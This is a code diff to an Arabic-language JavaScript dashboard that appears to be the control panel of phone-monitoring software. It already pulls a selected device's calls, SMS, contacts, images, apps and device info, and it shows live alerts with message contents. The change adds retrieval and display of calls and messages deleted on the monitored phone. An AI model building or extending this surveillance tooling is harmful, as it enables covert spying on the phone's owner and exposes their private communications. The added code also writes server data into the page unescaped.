@@ -8,12 +8,14 @@ let dataInterval = null;
 let allCalls = [];
 let allSMS = [];
 let allContacts = [];
+let allDeleted = [];
 let currentChat = null;
 let currentCallNumber = null;
 let currentContact = null;
 let wasOffline = true;
 let lastCallCount = 0;
 let lastSmsCount = 0;
+let lastDeletedCount = 0;
 let notificationShown = false;
 let soundPlayedForDevice = false;
 
@@ -42,14 +44,11 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
 }
 
-// ✅ فحص رسالة جديدة + علامة
 function checkNewSMS(newSMS) {
     if (!newSMS || newSMS.length === 0) return;
     if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
         const s = newSMS[0];
         showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
-        
-        // ✅ علامة حمراء
         const badge = document.getElementById('smsCount');
         if (badge) {
             badge.textContent = `(${newSMS.length}) 🔴`;
@@ -59,14 +58,11 @@ function checkNewSMS(newSMS) {
     lastSmsCount = newSMS.length;
 }
 
-// ✅ فحص مكالمة جديدة + علامة
 function checkNewCalls(newCalls) {
     if (!newCalls || newCalls.length === 0) return;
     if (lastCallCount > 0 && newCalls.length > lastCallCount) {
         const c = newCalls[0];
         showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
-        
-        // ✅ علامة حمراء
         const badge = document.getElementById('callCount');
         if (badge) {
             badge.textContent = `(${newCalls.length}) 🔴`;
@@ -76,7 +72,23 @@ function checkNewCalls(newCalls) {
     lastCallCount = newCalls.length;
 }
 
-// ✅ زر حذف الجهاز
+// ✅ فحص محذوفات جديدة
+function checkNewDeleted(deleted) {
+    if (!deleted || deleted.length === 0) return;
+    if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
+        const d = deleted[0];
+        const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
+        showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
+        
+        const badge = document.getElementById('deletedCount');
+        if (badge) {
+            badge.textContent = `(${deleted.length}) 🔴`;
+            badge.className = 'count badge-new';
+        }
+    }
+    lastDeletedCount = deleted.length;
+}
+
 async function deleteDevice() {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -167,6 +179,7 @@ async function updateLiveData() {
         if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
         if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
         if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
+        if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
     } catch (e) {}
 }
 
@@ -178,6 +191,48 @@ async function loadAllData() {
     await loadImages();
     await loadApps();
     await loadDeviceInfo();
+    await loadDeleted();
+}
+
+// ✅ تحميل المحذوفات
+async function loadDeleted() {
+    try {
+        const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
+        const deleted = await response.json();
+        
+        if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
+            checkNewDeleted(deleted);
+            allDeleted = deleted;
+            displayDeleted();
+        }
+    } catch (e) {}
+}
+
+// ✅ عرض المحذوفات
+function displayDeleted() {
+    const div = document.getElementById('deletedList');
+    if (!div) return;
+    
+    div.innerHTML = '';
+    
+    if (!allDeleted || allDeleted.length === 0) {
+        div.innerHTML = '<p style="color:#888;">لا توجد محذوفات</p>';
+        return;
+    }
+    
+    [...allDeleted].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach(item => {
+        const divItem = document.createElement('div');
+        divItem.className = 'conversation-item';
+        divItem.innerHTML = `
+            <div class="conversation-avatar">${item.type === 'deleted_call' ? '📞' : '💬'}</div>
+            <div class="conversation-info">
+                <div class="conversation-name">${item.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة'}</div>
+                <div class="conversation-preview">ID: ${item.id}</div>
+            </div>
+            <div class="conversation-time">${formatDate(item.timestamp)}</div>
+        `;
+        div.appendChild(divItem);
+    });
 }
 
 async function loadCalls() {
